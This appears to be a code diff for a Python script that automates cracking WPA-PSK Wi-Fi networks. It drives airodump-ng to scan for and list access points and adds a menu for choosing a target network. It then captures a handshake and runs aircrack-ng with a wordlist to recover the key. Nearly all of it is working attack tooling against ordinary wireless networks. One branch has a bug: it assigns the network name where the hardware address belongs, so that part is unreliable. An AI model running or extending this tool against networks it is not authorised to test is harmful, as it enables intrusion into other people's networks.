@@ -44,7 +44,7 @@ def main():
 		sys.exit('Please run as root')
 	try:
 		environmentSetup()
-		killInterference()
+		# killInterference()
 		while targetBSSID == "" or channel == "":
 			getTargetAccessPoint()
 		captureHandshake()
@@ -58,11 +58,12 @@ def is_valid_path(parser, arg):
         parser.error("The path %s does not exist!" % arg)
 
 
-def bash_command(cmd, stdout=subprocess.PIPE, stderr=None, stdin=subprocess.PIPE):
+def bash_command(cmd, stdout=subprocess.PIPE, stderr=None, stdin=subprocess.PIPE, shell=False):
 	process = subprocess.Popen(cmd.split(),
 			stdout=stdout,
 			stderr=stderr,
-			stdin=stdin)
+			stdin=stdin,
+			shell=shell)
 	return process
 
 
@@ -172,52 +173,106 @@ def getTargetAccessPoint():
 	global interfaceName
 	global channel
 	global targetBSSID
+	# global targetESSID
+	targetESSID = ''
 
-	while True:
-		while channel == '':
-			user_input = input("Channel number to listen to (0 to scan multiple): ")
-			if user_input.isdigit() and 0 <= int(user_input) <= 14:
-				channel = user_input
-		scanAccessPoints(interfaceName, channel)
-		result = input("Start new scan? (y=yes): ")
-		if result == 'y' or result == 'yes' or result == '1':
-			channel = ''
-			if os.path.isfile(packetPath + "dump-01.csv"):
-				os.remove(packetPath + "dump-01.csv")
-			continue
-		else:
-			break
+	while channel == '':
+		user_input = input("Channel number to listen to (0 to scan multiple): ")
+		if user_input.isdigit() and 0 <= int(user_input) <= 14:
+			channel = user_input
+	# get result of airodump-ng
+	AP_list = scanAccessPoints(interfaceName, channel)
+	
+	# get necessary columns (ESSID/BSSID/power/Authentication) and the max
+	# ESSID width (for formatting later)
+	ESSID_col = 0
+	BSSID_col = 0
+	power_col = 0
+	auth_col  = 0
+	max_ESSID_len = 0
+	for i,v in enumerate(AP_list[0]):
+		ESSID_col = i if 'ESSID' in v.strip() else ESSID_col
+		BSSID_col = i if 'BSSID' in v.strip() else BSSID_col
+		power_col = i if 'Power' in v.strip() else power_col
+		auth_col = i if 'Authentication' in v.strip() else auth_col
+	for line in AP_list[1:]:
+		max_ESSID_len = len(line[ESSID_col].strip()) if len(line[ESSID_col].strip()) > max_ESSID_len else max_ESSID_len
+
+	# filter list for only WPA-PSK authenticated APs
+	AP_list = [line for line in AP_list[1:] if 'PSK' in line[auth_col]]
+
+	# if user specifies an ESSID (name), find out what BSSID it corresponds to
+	if targetESSID != '':
+		for line in AP_list:
+			if line[ESSID_col].strip() == targetESSID:
+				targetBSSID = line[ESSID_col]
+				return
+	
+	# if ESSID not specified, prompt the user to select an AP
+	print()
+	print("\t      Power  {:{width}} : BSSID".format('ESSID',width=max_ESSID_len))
+	for i, v in enumerate(AP_list):
+		print("\t[{:2}] {:6} {:{width}} : {}".format(str(i), v[power_col], v[ESSID_col], v[BSSID_col], width=max_ESSID_len))
+	print()
 
 	# Get MAC address of the target access point (router)
-	while not validMacAddress(targetBSSID):
-		targetBSSID = input("Please select access point MAC address (BSSID 1): ")
+	user_input = ''
+	while not (user_input.isdigit() and 0 <= int(user_input) < len(AP_list)):
+		user_input = input("Please select a target access point: ")
+
+	targetBSSID = AP_list[int(user_input)][BSSID_col].strip()
+
+	print("targetBSSID = " + str(targetBSSID))
 
 
-def scanAccessPoints(interfaceName, channel):
+def scanAccessPoints(interfaceName, channel='0', scanTime=5):
+	global packetPath
+
 	# Allow user to select an AP (access point) by MAC address
 	print("Listing access points close to user's location...")
 
-	# Specify how long to run scan
-	scanTime = ''
-	while not scanTime.isdigit():
-		user_input = input("Time limit to listen: ")
-		scanTime = user_input
+	out = open(packetPath+"stdout.txt","wb")
+	err = open(packetPath+"stderr.txt","wb")
 
-	# if channel is specified, limit scan to given channel
+	# generate airodump command (plus arguments)
+	scan_command = "airodump-ng --output-format csv --encrypt wpa -w " + packetPath + "dump"
 	if int(channel) > 0:
-		airodump = bash_command("airodump-ng" +
-				" -c " + str(channel) +
-				" --output-format csv" +
-				" -w " + packetPath + "dump" +
-				" " + interfaceName)
-	else:
-		airodump = bash_command("airodump-ng" +
-				" --output-format csv" +
-				" -w " + packetPath + "dump" +
-				" " + interfaceName)
+		scan_command += " -c " + str(channel)
+	scan_command += " " + interfaceName
+	# scan networks
+	airodump = bash_command(scan_command, stdout=out, stderr=err)
+
+	# wait for airodump to dump AP csv list
+	timeStart = time.time()
+	while not os.path.isfile(packetPath+"dump-01.csv"):
+		if time.time()-timeStart > scanTime:
+			print("took too long")
+			break
+	# wait for scan of APs
 	time.sleep(int(scanTime))
+
+	# read output csv file for AP
+	with open(packetPath+'dump-01.csv') as csvfile:
+		AP_reader = csv.reader(csvfile, delimiter=',', quotechar='|')
+		AP_dump = [line for line in AP_reader]
+	# find AP in dump file
+	begin = 0
+	end = 0
+	for i, line in enumerate(AP_dump):
+		if 'BSSID' in line:
+			begin = i
+		if (len(line)==0) and  i>begin:
+			end = i
+			break
+	# reduce list to just APs (not associated clients)
+	AP_list = AP_dump[begin:end]
+
+	# cleanup
 	airodump.terminate()
-	print("Scan complete.")
+	if os.path.isfile(packetPath + "dump-01.csv"):
+		os.remove(packetPath + "dump-01.csv")
+
+	return AP_list
 
 
 def getInterfaceName():
@@ -367,11 +422,11 @@ def scanClientsAtAccessPoint(targetESSID=None, scanTime=5):
 		time.sleep(1)
 	# wait for scan of clients
 	time.sleep(int(scanTime))
+
 	# read output csv file for clients
 	with open(packetPath+'client-01.csv') as csvfile:
 		client_reader = csv.reader(csvfile, delimiter=',', quotechar='|')
 		client_dump = [line for line in client_reader]
-
 	# find clients in dump file
 	for i, line in enumerate(client_dump):
 		if 'Station MAC' in line:
@@ -412,8 +467,8 @@ def crackHandshake():
 	global targetBSSID
 	global dictionaryPath
 
-	process = bash_command("aircrack-ng -w " + dictionaryPath + " -b " + targetBSSID + " " + packetPath + "packet-01.cap", stderr=None)
-	print(process.stdout.read().decode('utf-8'))
+	process = bash_command("aircrack-ng -w " + dictionaryPath + " -b " + targetBSSID + " " + packetPath + "packet-01.cap", stdout=None, stderr=None)
+	process.wait()
 
 def cleanUp():
 	if os.path.exists(packetPath):
